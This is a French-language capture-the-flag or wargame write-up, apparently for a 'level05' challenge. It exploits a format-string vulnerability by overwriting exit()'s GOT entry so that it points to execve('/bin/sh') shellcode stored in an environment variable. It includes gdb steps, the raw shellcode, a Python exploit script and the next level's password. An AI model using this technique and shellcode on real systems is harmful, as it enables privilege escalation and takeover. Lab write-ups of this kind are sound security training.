En examinant le binaire, nous pouvons voir qu'un appel a printf est effectue puis juste apres, un appel a exit.
Le printf ne prenant en parametre seulement notre entree (dans un buffer de 100 bytes) nous pouvons en deduire
qu'une faille format string est presente dans le programme. Pour en avoir le coeur net il suffit d'envoyer
"%x" au binaire, et de voir si une addresse de la stack s'affiche. C'est le cas. Notre programme est 
donc vulnerable aux formats strings.

Le flag du user 06 n'est pas present sur la stack (comme lors d'un precedent level), inutile donc de dumper la memoire.
Nous ne pouvons pas ecraser EIP, car un appel a exit() est fait juste apres notre appel a printf(). 

Un moyen efficace d'exploiter une format string suivie d'un appel a exit(), est d'ecraser l'adresse GOT (Global Offset
Table) de l'appel systeme exit() pour la remplacer par l'adresse d'un eventuel shellcode stocke sur la stack. (la stack
etant executable ici...)

Commencons par recuperer l'adresse nous permettant de reecrire sur la GOT :

	$ gdb level05
	$ disas main
	$ disas 0x8048370
	$ x 0x80497e0

Nous avons donc l'adresse necessaire: 0x80497e0

Maintenant nous allons stocke notre shellcode dans une variable d'environnement et recuperer son adresse (soit avec gdb soit avec getenv.c)

	export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`
	
Maintenant il va falloir reecrire l'adresse 0x80497e0 par celle de notre shellcode. Nous devons ecrire 2 bytes par 2 bytes plutot que les 4 bytes d'un coup. Cela prendra beaucoup moins de temps. 

Le plus propre est d'utiliser python pour creer son exploit, avec la librairie struct.

En testant des valeurs arbitraires (comme des 'AAAABBBBCCCC') on se rend compte que nos valeurs sont stocke a l0eme adresse de la stack

/Ressources/exp.py : 

	import struct

	EXIT_PLT = 0x80497e0
	SHELLCODE = 0xffffde31

	def pad(s):
		return s+"X"*(100-len(s))

	exploit = ""
	exploit += struct.pack("I", EXIT_PLT)		# 0x80497e0
	exploit += struct.pack("I", EXIT_PLT+2)		# 0x80497e2
	exploit += "%4$56935x"           		# 2 derniers byte de l'adresse de notre shellcode (en decimal) auquel on soustrait 17 (padding)
	exploit += "%10$n "*10
	exploit += "%8987006x"           		# bidouiller jusqu'a obtenir 0xffff
	exploit += "%11$n"*10

	print pad(exploit)

Pour verifier a quoi ressembler l'adresse que nous reecrivons entre chaque modification :

	$ python /tmp/exp.py > /tmp/pay
	$ gdb level05
	$ b*main+207
	$ r < /tmp/pay
	$ x 0x80497e0

Nous arrivons donc a reecrire (2 bytes par 2 bytes) l'adresse de exit() sur la GOT. Le tour est joue.

	python /tmp/exp.py > /tmp/pay
	cat /tmp/pay - | ./level05
	

	$whoami
	=> level06
	
	$cat /home/users/level06/.pass
	=> h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

